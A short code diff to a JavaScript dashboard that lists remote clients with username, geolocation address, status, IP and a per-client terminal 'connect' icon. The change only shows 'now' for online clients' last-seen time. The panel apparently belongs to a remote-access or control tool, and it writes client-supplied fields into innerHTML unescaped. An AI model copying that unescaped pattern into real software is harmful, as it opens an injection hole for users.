@@ -95,12 +95,16 @@ async function updateDevices() {
         if (clientData.status == "Online") {
           image_url = 'https://upload.wikimedia.org/wikipedia/commons/4/4d/Microsoft_Fluent_UI_%E2%80%93_ic_fluent_wifi_1_24_filled.svg'
         }
+        time = "now"
+        if (clientData.last_online != "now") {
+          time = parseAndFormatTime(clientData.last_online)
+        }
         row.innerHTML = `
                   <td><input type="checkbox" class="row-select" data-row-id="${clientId}"></td>
                   <td>${clientData.username}</td>
                   <td>${clientData.geolocation.address}</td>
                   <td>${clientData.status}&nbsp; <img src='`+image_url+`' alt='Online/Offline Logo'</td>
-                  <td>${parseAndFormatTime(clientData.last_online)}</td>
+                  <td>${time}</td>
                   <td><img src="${osLogo}" type="os" alt="${osType}">${osType}</td>
                   <td>${ip_state}</td>
                   <td><img src='https://upload.wikimedia.org/wikipedia/commons/6/6f/Octicons-terminal.svg' id='connect' alt="Connect icon" class='terminal-icon' data-row-id="${clientId}"></td>
